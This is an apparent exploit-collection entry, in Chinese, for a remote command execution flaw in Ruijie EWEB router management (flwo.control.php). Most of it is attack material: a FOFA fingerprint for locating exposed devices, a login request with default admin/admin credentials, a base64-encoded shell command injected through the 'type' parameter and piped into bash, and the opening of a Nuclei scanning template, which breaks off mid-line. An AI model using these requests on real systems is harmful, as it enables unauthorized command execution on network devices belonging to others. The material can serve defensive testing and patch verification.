# 锐捷EWEBflwo.contro存在远程命令执行漏洞

- **系统**：锐捷　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name=="Ruijie 锐捷 EWEB"`
- **请求**：`POST /ddi/server/login.php HTTP/1.1`

**请求体 / payload**
```
先发送数据包，获取cookie
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
username=admin&password=admin?

使用获取cookie执行命令
cm0gLXJmIC4uL2lrbTEyMy50eHQgJiYgZWNobyBIZWxsb1dvcmxkID4gLi4vaWttMTIzLnR4dCAyPiYx
Bsae64解码
rm -rf ../ikm123.txt && echo HelloWorld > ../ikm123.txt 2>&1
POST /flow_control_pi/flwo.control.php?a=getFlowGroup HTTP/1.1
Host: 127.0.0.1
Content-Length: 160
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=e3t2n743strq8lu1anqod3bhu6;
type=%7Cbash+-c+%27echo+cm0gLXJmIC4uL2lrbTEyMy50eHQgJiYgZWNobyBIZWxsb1dvcmxkID4gLi4vaWttMTIzLnR4dCAyPiYx+%7C+base64+-d+%7C+bash+%…（脚本共 638 字，完整版见原文）
```

**其他**
- 锐捷EWEB flwo.contro存在远程命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
  * 五、 Nuclei
***
- 版本: * 锐捷NBR路由器
- Nuclei: ```http
id: RJEWEB-flwo-contro-RCE
info:
  name: 锐捷 EWEB-RCE-flwo.contro
  author: haoguoguo
  severity: high
  metadata:
    fofa-query: title="锐捷网络-EWEB网管系统"
variables:
  filename: "{{to_lower(rand_base(5))}}"
  boundary: "{{to_lower(rand_base(20))}}"
http:
  - raw:
      -
        POST /ddi/server/login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urle